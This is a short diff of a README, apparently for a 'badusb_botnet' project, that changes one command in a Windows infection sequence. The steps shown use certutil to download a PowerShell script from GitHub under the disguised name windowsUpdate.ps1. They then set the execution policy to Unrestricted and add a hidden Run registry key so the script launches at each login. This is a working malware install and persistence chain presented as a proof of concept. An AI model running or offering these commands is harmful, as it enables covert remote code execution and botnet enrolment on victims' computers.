@@ -105,7 +105,7 @@ Windows Powershell is too slow at startup, so we can use cmd to download the '.p
 
 ```cmd
 > certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
-> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 > reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
 > reboot (?)
 ```
